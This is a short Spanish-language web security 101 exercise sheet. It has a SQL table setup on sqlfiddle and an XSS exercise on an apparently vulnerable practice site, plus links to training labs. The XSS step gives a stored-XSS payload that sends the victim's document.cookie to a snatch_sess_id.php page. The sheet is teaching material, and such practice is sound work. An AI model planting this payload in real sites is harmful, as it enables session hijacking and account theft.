# Seguridad WEB 101

## Inyección SQL
### Ejercicio 1

1. http://sqlfiddle.com
2. Ejecutar los comandos:

``CREATE TABLE `users` (
  `id` INT NOT NULL AUTO_INCREMENT,
  `email` VARCHAR(45) NULL,
  `password` VARCHAR(45) NULL,
  PRIMARY KEY (`id`));``

``insert into users (email,password) values ('m@m.com',md5('abc'));``

3. Consulta en el lado derecho el usuario ``select * from users; ``

## XXS
### Ejercicio
1. Ingresa a http://www.techpanda.org/ 
2. Ingresa el usuario y password correctos.
3. Crea un contacto nuevo "Add a New Contact"
4. En el campo de _"first name"_ ingresa lo siguiente

``<a href=# onclick=\"document.location=\'http://techpanda.org/snatch_sess_id.php?c=\'+escape\(document.cookie\)\;\">TuNombre</a>``

## Recursos
* https://www.hacksplaining.com/lessons
* https://google-gruyere.appspot.com 
* XSS Gamification https://xss-game.appspot.com/ 
* SQL Injection https://redtiger.labs.overthewire.org/
